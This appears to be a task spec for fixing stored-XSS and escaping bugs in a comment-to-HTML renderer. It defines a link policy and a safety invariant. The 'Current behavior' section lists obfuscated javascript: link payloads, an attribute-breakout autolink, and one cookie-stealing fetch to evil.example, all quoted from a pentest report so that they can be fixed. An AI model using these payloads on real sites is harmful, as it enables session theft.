# SPEC: stored XSS and escaping glitches in the comment renderer (notemark)

## Goal

Make `notemark.to_html` conform to the rendering rules and link policy in
`README.md` (restated below), closing the reported stored-XSS vectors without
breaking any documented rendering behavior.

## Current behavior

Security report SEC-311 (external pentest) plus two user complaints. Every
input below is a ticket comment; the output is what `to_html` returns today:

```text
[click here](javascript&#58;alert%28document.cookie%29)
 -> <p><a href="javascript:alert%28document.cookie%29">click here</a></p>        (script runs on click)

[invoice](&#x6A;avascript:fetch%28%27//evil.example/%27+document.cookie%29)
 -> <p><a href="javascript:fetch%28%27//evil.example/%27+document.cookie%29">invoice</a></p>

[docs](java&#9;script:alert%281%29)
 -> <p><a href="java<TAB>script:alert%281%29">docs</a></p>     (browsers drop the tab -> javascript:)

see <https://status.example.com/"onmouseover="alert%281%29>
 -> <p>see <a href="https://status.example.com/"onmouseover="alert%281%29">https://status.example.com/"onmouseover="alert%281%29</a></p>
                                                                (script runs on hover)

Use `&lt;div&gt;` for wrappers
 -> <p>Use <code>&lt;div&gt;</code> for wrappers</p>           (users see "<div>", expected "&lt;div&gt;")

Tracking: <https://ship.example/?id=7&amp;lang=en>
 -> <p>Tracking: <a href="https://ship.example/?id=7&amp;amp;lang=en">https://ship.example/?id=7&amp;amp;lang=en</a></p>
                                                                (broken link and text shows "&amp;")
```

The pentester notes that more variants of the same ideas may exist.

## Desired behavior

1. All rendering rules in `README.md` ("Rendering rules") hold; outputs that
   are correct today must stay byte-for-byte identical (e.g. the visible tests,
   `[docs](https://ex.com/a?x=1&amp;y=2)` and `[docs](https://ex.com/a?x=1&y=2)`
   both → `<p><a href="https://ex.com/a?x=1&amp;y=2">docs</a></p>`).
2. Code spans are literal: `` `&lt;div&gt;` `` → `<code>&amp;lt;div&amp;gt;</code>`.
3. The link policy in `README.md` applies to **both** `[text](destination)`
   links and autolinks:
   1. decode character references exactly once (so
      `[x](&amp;#106;avascript:x)` yields the relative URL `&#106;avascript:x`,
      rendered `<a href="&amp;#106;avascript:x">x</a>`);
   2. remove tabs/LF/CR anywhere and strip C0 controls (U+0000–U+001F) and
      spaces from both ends;
   3. empty → not linked; a scheme (`[A-Za-z][A-Za-z0-9+.-]*:` at the start)
      other than `http`/`https`/`mailto` (case-insensitive) → not linked; no
      scheme → relative, allowed;
   4. linked output is `<a href="URL">…</a>` with URL = the result of step 2,
      attribute-escaped (`& < > " '`), original case kept; a link that is not
      linked renders only its text; an autolink renders the decoded URL as
      escaped text, e.g. `<https://ship.example/?id=7&amp;lang=en>` →
      `<a href="https://ship.example/?id=7&amp;lang=en">https://ship.example/?id=7&amp;lang=en</a>`.
4. Safety invariant for **any** input: the output contains only the tags
   `p`, `br`, `strong`, `em`, `code`, `a`; no attributes except `href` on `a`;
   and every `href`, after HTML attribute decoding and the browser
   normalization of step 3.2, either has no scheme or has scheme `http`,
   `https` or `mailto`.
5. Keep `notemark.to_html(source: str) -> str` as the public API.

## Allowed paths

`notemark/`, `tests/`, `README.md`.

## Non-goals

- No new markup features, no HTML sanitizer library, no change to mention or
  paragraph rendering.
- Percent-encoding normalization of URLs is not required.

## Acceptance criteria

- Every reported input renders safely and as specified by rules 1–4.
- Regression tests added under `tests/`; `python3 -m unittest discover -s tests -v` passes.

## Test commands

```
python3 -m unittest discover -s tests -v
```

## Handoff

List each root cause with its location, why each payload bypassed the policy,
and how you verified that correct outputs (ampersands in URLs, relative links,
mentions) are unchanged.
